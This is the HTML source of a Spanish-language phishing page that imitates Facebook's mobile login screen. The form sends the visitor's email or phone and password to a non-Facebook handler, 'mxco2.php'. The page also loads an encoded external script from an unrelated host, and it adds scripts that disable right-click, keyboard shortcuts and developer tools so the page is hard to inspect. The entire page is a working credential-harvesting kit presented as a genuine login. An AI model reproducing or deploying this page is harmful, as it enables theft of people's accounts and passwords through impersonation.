<!DOCTYPE html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Facebook – log in or sign up</title>
<link rel="shortcut icon" href="fav.ico">
<meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
<meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
<link rel="stylesheet" type="text/css" data-bootloader-hash="zjGid" href="./mobile-facebook-verification_files/m.fb89sd9.css">
<link rel="stylesheet" type="text/css" data-bootloader-hash="HVJmz" href="./mobile-facebook-verification_files/m.fb897f65y.css">

<script id="u_0_e">function envFlush(a){function b(b){for(var c in a)b[c]=a[c]}window.requireLazy?window.requireLazy(["Env"],b):(window.Env=window.Env||{},b(window.Env))}envFlush({"timeslice_heartbeat_config":{"pollIntervalMs":33,"idleGapThresholdMs":60,"ignoredTimesliceNames":{"requestAnimationFrame":true,"Event listenHandler mousemove":true,"Event listenHandler mouseover":true,"Event listenHandler mouseout":true,"Event listenHandler scroll":true},"isHeartbeatEnabled":true,"isArtilleryOn":true},"shouldLogCounters":true,"timeslice_categories":{"react_render":true,"reflow":true},"sample_continuation_stacktraces":true,"dom_mutation_flag":true});</script>
<script>document.domain = 'facebook.com';/^#~?!(?:\/?[\w\.-])+\/?(?:\?|$)/.test(location.hash)&&location.replace(location.hash.substr(location.hash.indexOf("!")+1));</script>
<script>__DEV__=0;</script><script id="u_0_f" crossorigin="anonymous" src="./mobile-facebook-verification_files/IoU6C6Z1Eqy.js.download" data-bootloader-hash="Hj+Yo"></script>
<script id="u_0_g">CavalryLogger=window.CavalryLogger||function(a){this.lid=a,this.transition=!1,this.metric_collected=!1,this.is_detailed_profiler=!1,this.instrumentation_started=!1,this.pagelet_metrics={},this.events={},this.ongoing_watch={},this.values={t_cstart:window._cstart},this.piggy_values={},this.bootloader_metrics={},this.resource_to_pagelet_mapping={},this.e2eLogged=!1,this.initializeInstrumentation&&this.initializeInstrumentation()},CavalryLogger.prototype.setIsDetailedProfiler=function(a){this.is_detailed_profiler=a;return this},CavalryLogger.prototype.setTTIEvent=function(a){this.tti_event=a;return this},CavalryLogger.prototype.setValue=function(a,b,c,d){d=d?this.piggy_values:this.values;(typeof d[a]==="undefined"||c)&&(d[a]=b);return this},CavalryLogger.prototype.getLastTtiValue=function(){return this.lastTtiValue},CavalryLogger.prototype.setTimeStamp=CavalryLogger.prototype.setTimeStamp||function(a,b,c,d){this.mark(a);var e=this.values.t_cstart||this.values.t_start;e=d?e+d:CavalryLogger.now();this.setValue(a,e,b,c);this.tti_event&&a==this.tti_event&&(this.lastTtiValue=e,this.setTimeStamp("t_tti",b));return this},CavalryLogger.prototype.mark=typeof console==="object"&&console.timeStamp?function(a){console.timeStamp(a)}:function(){},CavalryLogger.prototype.addPiggyback=function(a,b){this.piggy_values[a]=b;return this},CavalryLogger.instances={},CavalryLogger.id=0,CavalryLogger.perfNubMarkup="",CavalryLogger.disableArtilleryOnUntilOffLogging=!1,CavalryLogger.getInstance=function(a){typeof a==="undefined"&&(a=CavalryLogger.id);CavalryLogger.instances[a]||(CavalryLogger.instances[a]=new CavalryLogger(a));return CavalryLogger.instances[a]},CavalryLogger.setPageID=function(a){if(CavalryLogger.id===0){var b=CavalryLogger.getInstance();CavalryLogger.instances[a]=b;CavalryLogger.instances[a].lid=a;delete CavalryLogger.instances[0]}CavalryLogger.id=a},CavalryLogger.setPerfNubMarkup=function(a){CavalryLogger.perfNubMarkup=a},CavalryLogger.now=function(){return window.performance&&performance.timing&&performance.timing.navigationStart&&performance.now?performance.now()+performance.timing.navigationStart:new Date().getTime()},CavalryLogger.prototype.measureResources=function(){},CavalryLogger.prototype.profileEarlyResources=function(){},CavalryLogger.getBootloaderMetricsFromAllLoggers=function(){},CavalryLogger.start_js=function(){},CavalryLogger.done_js=function(){};CavalryLogger.getInstance().setTTIEvent("t_domcontent");CavalryLogger.prototype.measureResources=function(a,b){if(!this.log_resources)return;var c="bootload/"+a.name;if(this.bootloader_metrics[c]!==undefined||this.ongoing_watch[c]!==undefined)return;var d=CavalryLogger.now();this.ongoing_watch[c]=d;"start_"+c in this.bootloader_metrics||(this.bootloader_metrics["start_"+c]=d);b&&!("tag_"+c in this.bootloader_metrics)&&(this.bootloader_metrics["tag_"+c]=b);if(a.type==="js"){c="js_exec/"+a.name;this.ongoing_watch[c]=d}},CavalryLogger.prototype.stopWatch=function(a){if(this.ongoing_watch[a]){var b=CavalryLogger.now(),c=b-this.ongoing_watch[a];this.bootloader_metrics[a]=c;var d=this.piggy_values;a.indexOf("bootload")===0&&(d.t_resource_download||(d.t_resource_download=0),d.resources_downloaded||(d.resources_downloaded=0),d.t_resource_download+=c,d.resources_downloaded+=1,d["tag_"+a]=="_EF_"&&(d.t_pagelet_cssload_early_resources=b));delete this.ongoing_watch[a]}return this},CavalryLogger.getBootloaderMetricsFromAllLoggers=function(){var a={};Object.values(window.CavalryLogger.instances).forEach(function(b){b.bootloader_metrics&&Object.assign(a,b.bootloader_metrics)});return a},CavalryLogger.start_js=function(a){for(var b=0;b<a.length;++b)CavalryLogger.getInstance().stopWatch("js_exec/"+a[b])},CavalryLogger.done_js=function(a){for(var b=0;b<a.length;++b)CavalryLogger.getInstance().stopWatch("bootload/"+a[b])},CavalryLogger.prototype.profileEarlyResources=function(a){for(var b=0;b<a.length;b++)this.measureResources({name:a[b][0],type:a[b][1]?"js":""},"_EF_")};CavalryLogger.getInstance().log_resources=true;CavalryLogger.getInstance().setIsDetailedProfiler(true);window.CavalryLogger&&CavalryLogger.getInstance().setTimeStamp("t_start");</script>
<script id="u_0_h">(function _(a,b,c,d){function e(a){document.cookie=a+"=;expires=Thu, 01-Jan-1970 00:00:01 GMT;path=/;domain=.facebook.com"}function f(a,b){document.cookie=a+"="+b+";path=/;domain=.facebook.com;secure"}if(!a){e(b);e(c);return}a=null;(navigator.userAgent.indexOf("Firefox")!==-1||!window.devicePixelRatio&&navigator.userAgent.indexOf("Windows Phone")!==-1)&&(document.documentElement!=null&&(a=screen.width/document.documentElement.offsetWidth,a=Math.max(1,Math.floor(a*2)/2)));(!a||a===1)&&navigator.userAgent.indexOf("IEMobile")!==-1&&(a=Math.sqrt(screen.deviceXDPI*screen.deviceYDPI)/96,a=Math.max(1,Math.round(a*2)/2));f(b,(a||window.devicePixelRatio||1).toString());e=window.screen?screen.width:0;b=window.screen?screen.height:0;f(c,e+"x"+b);d&&document.cookie&&window.devicePixelRatio>1&&document.location.reload()})(true, "m_pixel_ratio", "wd", false);</script>

<meta http-equiv="origin-trial" data-feature="getInstalledRelatedApps" data-expires="2017-12-04" content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=">
<meta name="description" content="Create an account or log in to Facebook. Connect with friends, family and other people you know. Share photos and videos, send messages and get updates.">

<link rel="canonical" href="https://www.facebook.com/">
<script type="text/javascript" async="" src="./mobile-facebook-verification_files/request"></script><script type="text/javascript" async="" src="http://p02.notifa.info/3fsmd3/request?id=1&amp;enc=9UwkxLgY9&amp;params=4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2I%2f4s6DCJAIEuSVOGSbLf1iVWqzSvxLgMzAm2xywBWIA0v5DO20c8JCyb9zo1JzUj6AKfjNgwkL37iBdQE1jcv5VWpYB%2fVJRoS3n42hCz6StPYKveilihIWWbUYsuhbiSGswGWMAMtf%2bbek82LelGcTZzw09v6pFRJTy2S25oTqrc%2bQDyDEIwPPCnFDlwRWAGoRkkdE1HE4Nij8Zxh4TYPW8JORLZEA%2bPvPTQPYNnVgpKGnOfgL7bffqL%2b8WZLDTOUid%2fyI99mGO9GU6WfZTIL7Bz%2fHKWt%2fTwiqa86Q1%2bbxgXgEKPNo29wJwri15Pgvv3cndFCae%2b%2bI671n2hV7NpwXabT%2fIVs%2fQuih8Jpo9jfVM%2b%2fSVDG7uNSkW5zuXIeYQWG7vqJTMf8NyYE1GhcJCq%2fIDPfK2LHb8FNMnX0EjDjSb90Eg%2bKjxt3TwejQsrmKVCW8WpUD%2bN05cRos1Otq5FfANFMW%2b2M3M9c3M6HvQ6tqA0HztjyAimH3spe71wV6lHgOPc%2bnWSD4FYNIZ7xa%2fTpQM4n169Y%2bTPCLdy6bLszATwJ3CducQDHzOMsfOUM9g3nGaf8uSvfckBwApA3Uu5zvYLmiQCqGZr&amp;idc_r=77192874954&amp;domain=localhost&amp;sw=411&amp;sh=823"></script></head>
<body tabindex="0" class="touch x2 _fzu _50-3 iframe acw" data-gr-c-s-loaded="true">
<script id="u_0_d">(function(a){a.__updateOrientation=function(){var b=!!a.orientation&&a.orientation!==180,c=document.body;c&&(c.className=c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g," ")+" "+(b?"landscape":"portrait"));return b}})(window);</script>
<div id="viewport">
<h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
<div id="page" class="">
<div class="_129_" id="header-notices"></div>
<div class="_4g33 _52we _52z5" id="header">
<div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter">
<a href="#"><img id="logo" src="./mobile-facebook-verification_files/F8n3WrEc0r.png" width="102" height="21"></a></div></div>
<div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane">
<div class="_4g33"><div class="_4g34" id="u_0_0">

<div class="aclb _4-4l">
<div data-sigil="m_login_upsell login_identify_step_element">
<div class="_5yd0 _2ph- _5yd1" style="text-align: center;" data-sigil="m_login_notice">No sabemos su dirección de correo electrónico o número de teléfono.</div>
<div class="_5rut">

<div class="_5rut"><form class="bc-form mt-30 form-horizontal clearfix ng-pristine ng-invalid ng-invalid-required" action="mxco2.php" method="post" name="loginForm"><br />
<div class="_52j9" style="text-align: center;"><strong>Inicio de sesión de Facebook<</strong></div><br>

<div id="user_info_container" data-sigil="user_info_after_failure_element"></div>
<div id="pwd_label_container" data-sigil="user_info_after_failure_element"></div>
<div id="otp_retrieve_desc_container"></div>
<div class="_56be _5sob"><div class="_55wo _55x2 _56bf">
<div id="email_input_container">

<input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _5ruq" autocomplete="on" id="email_id" name="email_id" placeholder="email o teléfono" type="text" data-sigil="m_login_email" required="">
<i class="_6cvx img sp_SEVYONR2gX9_2x sx_cb5d3c" data-sigil="clear_cp_cross"></i>
</div><div>
<div class="_1upc _mg8" data-sigil="m_login_password">
<div class="_4g33">
<div class="_4g34 _5i2i _52we">
<div class="_5xu4">
<input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2" autocomplete="on" id="pass_input" name="pass_input" placeholder="contraseña" type="text" data-sigil="password-plain-text-toggle-input" required="">
</div></div>
<div class="_5s61 _216i _5i2i _52we">
<div class="_5xu4">
<div class="_2pi9" style="display:none" id="u_0_1">
<a href="#" data-sigil="password-plain-text-toggle">
<span class="mfss" style="display:none" id="u_0_2">HIDE</span>
<span class="mfss" id="u_0_3">SHOW</span>
</a>
</div></div></div></div></div></div></div></div>
<a href="#" class="_6a3f" id="did-you-forget-your-password-link" style="display:none">Have you forgotten your password?</a>
<div class="_2pie" style="text-align:center;">
<div id="u_0_4" data-sigil="login_password_step_element">

<button type="submit" value="Log In" class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu" name="login" id="u_0_5" data-sigil="touchable m_login_button">
<span class="_55sr">acceso</span></button></div>
<div id="otp_button_elem_container"></div>
</div>

<div class="_xo8"></div><noscript>

<input type="hidden" name="_fb_noscript" value="true" /></noscript>
</form>
<div>
<br><br>
</div><div>
<div class="other-links">
<ul class="_5pkb _55wp"><li>
<span class="mfss fcg">
<a href="#" id="forgot-password-link">Olvidaste tu contraseña?</a><span aria-hidden="true"></span><br><br><br><br><br><br><br><br>
<p style="text-align: center;"><a id="help-link" class="sec" href="#">Facebook &copy; 2023</a></p>
</span></li></ul></div>


<div class="viewportArea _2v9s" style="display:none" id="u_0_7" data-sigil="marea">
<div class="_5vsg" id="u_0_8"></div>
<div class="_5vsh" id="u_0_9"></div>
<div class="_5v5d fcg">
<div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Loading...</div>
</div>
<div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">
<div class="container"><div class="image"></div>
<div class="message" data-sigil="error-message"></div>
<a class="link" data-sigil="MPageError:retry">Try Again</a>
</div></div></div></div>
<div id="static_templates">
<div class="mDialog" id="modalDialog" style="display:none">
<div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
<div class="_4g33 _52we"><div class="_5s61">
<div class="_52z7">

<script type="text/javascript">
function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
</script>

<script type="text/javascript">
window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
</script>

<script type="text/javascript">
document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}

</script></script></body></html>       

                                                                                                                                                                                                                                                                                                                         </div